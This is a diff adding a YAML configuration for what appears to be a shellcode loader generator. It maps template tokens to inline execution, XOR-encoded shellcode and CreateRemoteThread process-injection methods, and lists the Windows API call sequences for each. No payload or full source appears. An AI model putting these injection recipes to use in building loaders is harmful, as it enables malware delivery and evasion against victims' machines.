@@ -1,0 +1,44 @@
+shellcode_template:
+  sourcePath: "Source/Shellcode.c"
+  includePath: "Include/Shellcode.h"
+  substitutions:
+    shellcode: "${SHELLCODE}" 
+    shellcode_size: "${SHELLCODE_SIZE}"
+  includeGuard: "SHELLCODE_H"
+  sourceOutputName: "Shellcode.c"
+  includeOutputName: "Shellcode.h"
+
+loader_template:
+  - token: "inline"
+    key_required: false
+    method: "VirtualAlloc, memcpy, ((void(*)())exec)();"
+    files:
+      - sourcePath: "Source/Inline.c"
+        outputPath: "Main.c"
+  
+  - token: "inline_xor"
+    enc_type: "xor"
+    key_required: true
+    method: "VirtualAlloc, xorShellcode, memcpy, ((void(*)())exec)();"
+    files:
+      - sourcePath: "Source/Inline_xor.c"
+        outputPath: "Main.c"
+        substitutions: 
+          key: "${KEY}"
+
+      - sourcePath: "Source/Xor.c"
+        outputPath: "Xor.c"
+
+  - token: "createremotethread"
+    key_required: false
+    method: "OpenProcess, VirtualAllocEx (PAGE_EXECUTE_READWRITE), WriteProcessMemory, CreateRemoteThread, WaitForSingleObject, CloseHandle"
+    files:
+      - sourcePath: "Source/CreateRemoteThread.c"
+        outputPath: "Main.c"
+  
+  - token: "createremotethreadrx"
+    key_required: false
+    method: "OpenProcess, VirtualAllocEx (PAGE_READWRITE), WriteProcessMemory, VirtualProtect (PAGE_EXECUTE_READ), CreateRemoteThread, WaitForSingleObject, CloseHandle"
+    files:
+      - sourcePath: "Source/CreateRemoteThreadRx.c"
+        outputPath: "Main.c"
